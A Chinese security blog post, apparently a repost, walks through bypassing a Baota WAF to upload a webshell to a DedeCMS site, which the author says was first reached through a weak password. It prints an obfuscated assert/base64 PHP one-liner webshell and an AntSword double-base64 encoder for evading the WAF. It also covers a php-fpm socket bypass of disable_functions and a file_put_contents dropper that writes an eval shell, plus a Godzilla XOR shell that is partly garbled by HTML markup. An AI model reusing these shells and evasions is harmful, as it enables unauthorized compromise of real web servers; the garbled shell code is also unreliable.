# 原创
：  复现 文件上传漏洞bypass

# 复现 文件上传漏洞bypass

> 
<h3>公众号：掌控安全EDU 分享更多技术文章，欢迎关注一起探讨学习</h3>


### 1，弱口令发现目标网站，为宝塔搭建的dedecms，于是自己服务器搭建同样的

### 2 get请求phpinfo() 有waf，上传文件有waf

### 3，寻找资料，发现是，宝塔的ngix防火墙。同样在自己的服务器上部署成功。顺便还看到了，宝塔的过滤规则。

<br/> 可以发现， 规则，对get，post ，cookie，等方式的eval，还有base64都进行了过滤

### 4，过waf的一句话， eval和assert的区别

<br/> 规则， 对eval( base64( phpinfo( 等过滤了。可以采取字符串拼接的方式。<br/> 但是，eval是不能够被拼接的。因为eval()是一个语言构造器,他不能使用PHP提供的可变函数来调用<br/> 上代码：
1.  `&lt;?php` 1.  `$a='assert';` 1.  `$m='base64_decode';` 1.  `$a($m($_REQUEST['z']));` 
### 5，为什么要base64呢？因为蚁剑，和菜刀的流量特征。。里面有base64

<br/> 这个就是蚁剑的流量特征。有明显的base64所以直接被过滤掉了。<br/> 通过查资料。知道，1方面要对小马进行base64编码， 另外一方面要对蚁剑进行魔改。小马就是上面的小马了。至于蚁剑的魔改， 直接改配置 。简单来说，就是双base64
1.  `'use strict';` 1.   1.  `module.exports = (pwd, data, ext={}) =&gt; {` 1.  `data[pwd] = Buffer.from(data['_']).toString('base64');` 1.   1.  `delete data['_'];` 1.   1.  `return data;` 1.  `}` 
其实当小马写入进去的时候， 就可以执行了。<br/> 不过传进去的是phpinfo() 的base64编码 . 正好小马是base64decode

### 6 蚁剑连接成功。

当然编码格式得选刚才自己写的编码

### 7，但是控制台，不管输入whoami，还是ls ，还是其他命令，全部都是ret=127

<br/> 通过查资料知道了。这是phpinfo 里面设置的disable_function 过滤掉了， system函数。

### 8，于是要绕过disable_function 。

1，我先找的资料，是蚁剑的绕过disable_function 。蚁剑有个插件市场有绕过disable_function

<br/> 通过一个个测试， 只有选择fastcgi/php_FPM。并且自己狠狠地恶补了这个知识。大意就是，fastcgi是个解释器，直接修改这个解释器，从而绕过phpinfo的disbale_function .

<br/> 千万要注意的是，这个得选择这个。找了好多资料，测试好多次。一直找不到。其他的都不对。

<br/>`/tmp/php-cgi-70.sock`

### 9，蚁剑文件上传成功。

本来到这里就结束了。然后连接.antproxy.php 这个文件， 密码不变。就能够成功连接上。不知道为什么， 我的蚁剑不成功。返回是空， 有知道的大佬， 求知道下

### 10，由于蚁剑没成功。找了资料说哥斯拉也有绕过disable_function 。于是哥斯拉安排上。成功获得权限www

<br/> 一定要注意FPM/FCGI的地址不能写错<br/> /tmp/php-cgi-56.sock

##### 备注：中间还有一个步骤。那就是， 哥斯拉生产的php小马第一个有base64流量特征，所以穿不进去， 被waf拦截。其他2个php小马没有流量特征是可以用的。但是， 里面有eval函数。于是。我用file_put_contents 写文件， 直接把哥斯拉的小马写进去了。具体参考如下

<br/> 一句话：

```
&lt;?php

$a=base64_decode($_REQUEST['test']);

echo $a;

assert($a);
```

poc:

```
$a = "好好学习，天天向上；福如东海，寿比南山";

$b = file_put_contents('test.txt', $a);

$b = file_put_contents('test.txt','好好学习，天天向上；福如东海，寿比南山');



file_put_contents('shell.php','&lt;?php eval($_REQUEST[8]);');







//哥斯拉xor一句话

file_put_contents('xor.php','&lt;?php

&lt;span class="label label-primary"&gt;@session_start();#CTL{n}&lt;/span&gt;&lt;span&gt;@set_time_limit(0);#CTL{n}&lt;/span&gt;&lt;span&gt;@error_reporting(0);#CTL{n}function&lt;/span&gt; encode($D,$K){

for($i=0;$i@run($data),$key);#CTL{n}&lt;/span&gt; }else{

if (strpos($data,"getBasicsInfo")!==false){

$_SESSION[$payloadName]=encode($data,$key);

}

}

}

');
```

备注：$b的内容进行base64编码

> 
申明：本公众号所分享内容仅用于网络安全技术讨论，切勿用于违法途径，
所有渗透都需获取授权，违者后果自行承担，与本号及作者无关，请谨记守法.


**没看够~？欢迎关注！**

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/d36ecb7bbc0d4e379ca57813080e7bee.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/8fba6afce31c4f1095a6d42c7821302d.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/af7cfe3265504d39a2c7168cf7d23446.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/59588b879da54d28afce520f92a61ebf.png" width="665"/>

应急响应笔记

学习路线
